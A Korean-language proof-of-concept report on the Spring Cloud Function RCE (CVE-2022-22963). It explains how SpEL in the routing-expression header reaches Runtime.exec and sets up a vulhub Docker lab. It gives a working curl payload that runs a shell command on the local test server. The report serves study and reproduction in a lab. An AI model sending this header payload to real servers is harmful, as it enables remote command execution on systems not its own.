# CVE-2022-22963 - Spring Cloud Function 원격 코드 실행 (RCE) PoC 보고서

## 요약

CVE-2022-22963은 Spring Cloud Function 3.1.6 이하 및 3.2.2 이하 버전에서 발생하는 **원격 코드 실행(RCE)** 취약점이다.  
공격자는 **`spring.cloud.function.routing-expression`** HTTP 헤더에 Java 표현식을 삽입하여 서버 측에서 원격으로 임의의 코드를 실행할 수 있다.


### ✔️ 취약점 원인

- Spring Cloud Function은 요청을 라우팅할 때,  
  `spring.cloud.function.routing-expression`이라는 헤더를 읽어 SpEL(Spring Expression Language)을 해석함
- 이 필드에 Java의 `Runtime.getRuntime().exec()` 호출 같은 명령이 들어오면,  
  **해당 명령어를 실행시켜버림** (보안 필터링 없음)
- 즉, 공격자는 **HTTP 요청만으로 서버 내에서 임의 명령어를 실행할 수 있음**

### ✔️ 공격 흐름

1. 공격자가 POST 요청에 악성 헤더 삽입  
2. Spring 서버가 해당 SpEL을 파싱하여 함수로 인식  
3. Java `Runtime.exec()` 호출됨 → 명령어 실행  
4. 명령어 실행 결과는 로그나 파일로 확인 가능

---

## 환경 구성

### 1. 취약한 Docker 환경 다운로드 (sparse checkout)

```bash
mkdir vulhub-cve
cd vulhub-cve
git init
git remote add origin https://github.com/vulhub/vulhub.git
git config core.sparseCheckout true
echo "spring/CVE-2022-22963" >> .git/info/sparse-checkout
git pull origin master
cd spring/CVE-2022-22963
```

### 2. 취약점 재현
```bash
curl -X POST http://localhost:8080/functionRouter \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\", \"-c\", \"id > /tmp/id.txt\"})" \
  -H "Content-Type: text/plain" \
  --data 'test'
```

### 3. 확인
<img width="1466" alt="image" src="https://github.com/user-attachments/assets/f811c6c4-c346-4254-9d2b-a3086f9f2a8c" />

```bash
docker exec -it cve-2022-22963-spring-1 bash
cat /tmp/id.txt
```
